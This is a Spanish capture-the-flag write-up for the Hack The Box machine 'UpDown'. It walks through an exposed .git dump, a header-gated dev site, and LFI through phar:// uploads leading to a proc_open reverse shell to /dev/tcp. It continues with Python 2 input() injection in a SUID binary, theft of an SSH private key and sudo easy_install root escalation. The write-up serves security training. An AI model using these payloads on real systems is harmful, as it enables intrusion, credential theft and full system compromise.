---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/493
dificultad: Fácil
ip: 10.10.11.177
os: Linux
relacionados:
  - "[[Subdomain Discovery]]"
  - "[[.git Exposure]]"
  - "[[PHP Source Analysis]]"
  - "[[Information Leakage]]"
  - "[[Abusing HTACCESS Policies]]"
  - "[[Abusing File Upload]]"
  - "[[Wrappers]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Abusing SUID Binary]]"
  - "[[Abusing Sudoers]]"
  - "[[File Inclusion]]"
  - "[[Bypass de Funciones Deshabilitadas]]"
  - "[[Bypass de Filtros con Wrappers PHP]]"
  - "[[preg_match]]"
---
# HackTheBox - UpDown

## Reconocimiento

### Escaneo de Puertos con Nmap

Inicié mi fase de reconocimiento con un escaneo de puertos exhaustivo utilizando **Nmap** para identificar los servicios expuestos en la máquina objetivo.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p22,80 $(cat ip) -oN logs/updown-sCV

```
El resultado del escaneo reveló dos puertos abiertos:
- **Puerto 22/tcp**: Servicio **SSH** (OpenSSH 8.2p1).
- **Puerto 80/tcp**: Servicio **HTTP** (Apache/2.4.41).
    
### Enumeración Web

Al acceder al servicio web en el puerto 80, encontré una aplicación que permitía verificar si un sitio web estaba activo. En la parte inferior de la página, observé el dominio `siteisup.htb`, el cual añadí a mi archivo `/etc/hosts` para facilitar la interacción.
```Bash
echo "10.10.11.177 siteisup.htb" | sudo tee -a /etc/hosts
```

Para entender el comportamiento de la aplicación, introduje `http://127.0.0.1` y activé el modo de depuración. La aplicación realizaba una petición HTTP a la URL proporcionada y mostraba la respuesta, confirmando su funcionalidad básica.

### Búsqueda de Virtual Hosts (vHosts)

Sospechando la existencia de otros subdominios, utilicé **Ffuf** para realizar un fuzzing de vHosts.
```Bash
ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/wordlists/subdomains.txt -fs 1131
```

> [!info] Nota sobre el filtrado en Ffuf
> 
> El servidor respondía con un código 200 OK para cualquier subdominio, pero el tamaño de la respuesta para los subdominios inexistentes era siempre de 1131 bytes. Utilicé el parámetro -fs 1131 para filtrar estas respuestas y concentrarme solo en los resultados válidos.

El escaneo reveló el subdominio `dev.siteisup.htb`, pero al intentar acceder a él, recibí un error `403 Forbidden`. Lo agregué a mi archivo `/etc/hosts` para futuras pruebas.
```Bash
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

### Enumeración de Directorios

Dejando el subdominio `dev` de lado por un 10.10.11.177momento, procedí a buscar directorios en el dominio principal con **Gobuster**.
```Bash
gobuster dir -u http://siteisup.htb/ -w /usr/share/wordlists/dirb/common.txt
```

Encontré un directorio `/dev`, pero al visitarlo, la página estaba en blanco. Decidí profundizar y lancé otro escaneo de Gobuster apuntando específicamente a este directorio.
```Bash
gobuster dir -u http://siteisup.htb/dev -w /usr/share/wordlists/dirb/common.txt
```

Este segundo escaneo reveló un hallazgo crucial: un directorio `.git`.


---

## Análisis de vulnerabilidades

### Repositorio Git Expuesto

La presencia de un directorio `.git` expuesto en un servidor web es una mala configuración de seguridad grave. Permite, en muchos casos, descargar el código fuente completo de la aplicación. Utilicé la herramienta **git-dumper** para clonar el repositorio localmente.
```Bash
git-dumper http://siteisup.htb/dev/.git dev
```

Una vez descargado, exploré los archivos del repositorio. El archivo que más llamó mi atención fue `.htaccess`, un archivo de configuración de Apache.
```Apache
# This is a secure file
# Only for developers

# Deny all access
Order deny,allowonly4dev
Deny from all

# Allow access if the following header is present
<If "%{HTTP:Special-Dev} == 'only4dev'">
    Allow from all
</If>
```

El contenido del `.htaccess` explicaba por qué recibía un error `403 Forbidden` en `dev.siteisup.htb`. El acceso solo se permite si la petición incluye una cabecera HTTP específica: `Special-Dev: only4dev`.

### Análisis del Código Fuente

Con el código fuente en mi poder, analicé los archivos `index.php` y `checker.php`.

En `index.php`, identifiqué una vulnerabilidad de **Inclusión Local de Ficheros (LFI)**.
```PHP
// index.php
$page=$_GET['page'];
if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
    include($_GET['page'] . ".php");
}else{
    include("checker.php");
}
```

La función `include()` utiliza la entrada del usuario a través del parámetro `page` sin una sanitización adecuada. Aunque existe un filtro `preg_match` que bloquea el acceso a directorios comunes del sistema, este no impide el uso de _wrappers_ de PHP como `phar://`.

En `checker.php`, analicé la lógica de subida de archivos.
```PHP
// checker.php (fragmento)
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
    die("Extension not allowed!");
}
// ...
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
// ...
$websites = explode("\n",file_get_contents($final_path));
// ...
@unlink($final_path);
```

El script implementa una **lista negra de extensiones**, pero omite algunas potencialmente peligrosas como `.phar`. Esto me permitiría subir un archivo PHP empaquetado y ejecutarlo a través de la vulnerabilidad LFI.

> [!warning] Listas Negras vs. Listas Blancas
> 
> Este es un ejemplo clásico de por qué las listas blancas (permitir solo extensiones conocidas y seguras) son mucho más seguras que las listas negras (intentar bloquear todas las extensiones maliciosas). Es casi imposible prever todas las extensiones que podrían ser explotadas.


---

## Explotación de vulnerabilidades

### Obtención de Ejecución de Código Remoto (RCE)

Mi plan de ataque era el siguiente:
1. Subir un archivo `.phar` que contenga un payload PHP.
2. Utilizar la vulnerabilidad LFI con el wrapper `phar://` para ejecutar el código dentro del archivo subido.
    
Primero, configuré **Burp Suite** para añadir automáticamente la cabecera `Special-Dev: only4dev` a todas mis peticiones, lo que me dio acceso a `dev.siteisup.htb`.

Luego, creé un archivo PHP simple para confirmar la ejecución de código.
```Bash
echo "<?php phpinfo(); ?>" > info.php
```

Para poder subirlo, lo comprimí en un `.zip` y lo renombré a `.txt`, una extensión permitida por el filtro.
```Bash
zip info.zip info.php
mv info.zip info.txt
```

Subí el archivo `info.txt` a través del formulario en `dev.siteisup.htb`. A continuación, navegué al directorio `/uploads` para encontrar la carpeta con un nombre aleatorio (hash MD5) donde se alojaba mi archivo. Finalmente, construí la URL para explotar el LFI y el wrapper `phar://`.

```http
http://dev.siteisup.htb/?page=phar://uploads/f4ffea0fb8f7269a2cca12cd1b266e58/info.txt/info
```

Al visitar esta URL, se mostró la página de `phpinfo()`, confirmando que tenía **RCE**.

### Bypass de Funciones Deshabilitadas y Shell Inversa

La salida de `phpinfo()` reveló que muchas funciones peligrosas como `system()`, `shell_exec()` y `popen()` estaban deshabilitadas. Para encontrar una función que me permitiera obtener una shell, utilicé la herramienta `dfunc-bypasser`. Modifiqué el script para que incluyera la cabecera HTTP requerida.
```Python
# Modificación en dfunc-bypasser.py
phpinfo = requests.get(url, headers={"Special-Dev":"only4dev"}).text
```

Ejecuté el script y descubrí que la función `proc_open()` no estaba deshabilitada.

> [!note] ¿Qué es proc_open()?
> 
> proc_open() es una función de PHP que ejecuta un comando y proporciona un control detallado sobre los flujos de entrada/salida del proceso. Es muy similar a popen() y puede ser utilizada para ejecutar comandos del sistema y establecer una shell inversa.

Creé un nuevo payload para una shell inversa utilizando `proc_open()`.
```PHP
<?php
$descriptorspec = array(
   0 => array('pipe', 'r'), // stdin
   1 => array('pipe', 'w'), // stdout
   2 => array('pipe', 'a')  // stderr
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.17/443 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
```

Repetí el proceso: guardé el código como `rev.php`, lo comprimí, lo renombré a `rev.txt` y lo subí al servidor. Puse un oyente de **Netcat** en mi máquina y activé el payload con la misma técnica de LFI y `phar://`.
```Bash
# En mi máquina
nc -lvnp 443
```

Conseguí una shell inversa como el usuario **www-data**.


---

## Escalada de privilegios

### Movimiento Lateral: www-data a developer

Una vez dentro, enumeré el sistema. El archivo `/etc/passwd` me mostró la existencia del usuario `developer`. Al explorar su directorio `/home/developer`, encontré una carpeta llamada `dev` con permisos de escritura para el grupo `www-data`. Dentro de esta carpeta había dos archivos:
- `siteisup`: un binario con el bit **SUID** activado, propiedad del usuario `developer`.
- `siteisup.py`: un script de Python 2.
```Python
# Contenido de siteisup.py
import requests
url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
    print "Website is up"
else:
    print "Website is down"
```

El binario SUID ejecutaba este script. El script utilizaba la función `input()` de Python 2, que es notoriamente insegura.

> [!danger] Vulnerabilidad de input() en Python 2
> 
> En Python 2, la función input() no trata la entrada como una cadena de texto, sino que la evalúa como código Python. Esto es equivalente a eval(raw_input()) y permite la inyección de código arbitrario.

Para explotar esto, simplemente necesitaba introducir código Python que me diera una shell. Ejecuté el binario SUID y, cuando me pidió la URL, introduje mi payload.
```Bash
./siteisup
Enter URL here: __import__('os').system('/bin/bash')
```

Esto me otorgó una shell como el usuario **developer**. Para asegurar un acceso persistente y más cómodo, copié su clave SSH privada de `/home/developer/.ssh/id_rsa` a mi máquina y me conecté a través de SSH.

### Escalada a root

Ya como `developer`, verifiqué mis privilegios de `sudo`.
```Bash
sudo -l
```

```
Matching Defaults entries for developer on updown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User developer may run the following commands on updown:
    (ALL) NOPASSWD: /usr/bin/easy_install
```

Descubrí que podía ejecutar `/usr/bin/easy_install` como `root` sin necesidad de contraseña. Consulté **GTFOBins** y encontré una técnica de escalada de privilegios para este binario. `easy_install` no elimina los privilegios elevados al instalar un paquete desde un `setup.py`, lo que permite ejecutar código como `root`.

Seguí los pasos indicados en GTFOBins para crear un `setup.py` malicioso que ejecutara una shell.
```Bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/bin/easy_install $TF
```

Al ejecutar el último comando, el payload se activó y obtuve una shell interactiva como **root**. Finalmente, pude leer la bandera en `/root/root.txt`.


___

## Bandera(s)

> [!flag] `flag{user}`
> 35b233299a66e9e5e7e4743d3f5884bd
^bandera-user

> [!flag] `flag{root}`
49920f3829babf1815bbc060d7c56b42
^bandera-root
